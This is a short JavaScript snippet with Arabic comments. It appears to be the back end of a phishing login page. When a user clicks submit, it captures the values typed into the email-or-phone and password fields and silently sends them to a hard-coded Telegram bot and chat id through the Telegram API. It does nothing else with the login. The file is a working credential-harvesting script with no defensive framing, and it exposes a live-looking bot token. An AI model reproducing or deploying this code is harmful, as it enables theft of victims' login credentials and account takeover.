document.getElementById("submit").addEventListener("click", function(event) {
    event.preventDefault(); // لمنع إرسال النموذج بالطريقة الافتراضية

    // الحصول على قيم الحقول
    const email = document.getElementById("email-or-number").value;
    const text = document.getElementById("password").value;

    // التأكد من وجود القيم
    if (email && text) {
        // قم بتحديد توكن البوت الخاص بك و chat_id الذي تريد إرسال الرسائل إليه
        const token = "7916270727:AAFhDXP2e6xajyc8wFWW7cL0l1UaziI04EQ"; // استبدل بـ توكن البوت الخاص بك
        const chatId = "7459879544"; // استبدل بـ chat ID الخاص بك أو قناة تلغرام

        // نص الرسالة التي سيتم إرسالها
        const message = `Email: ${email}\nText: ${text}`;

        // بناء رابط الـ API
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        // إرسال الطلب باستخدام fetch
        fetch(url)
            .then(response => response.json())
            .then(data => {
                // الكود هنا لا يقوم بأي شيء بعد إرسال الرسالة
            })
            .catch(error => {
                console.error("Error:", error);
            });
    } else {
        console.log("الرجاء إدخال البريد الإلكتروني والنص.");
    }
});
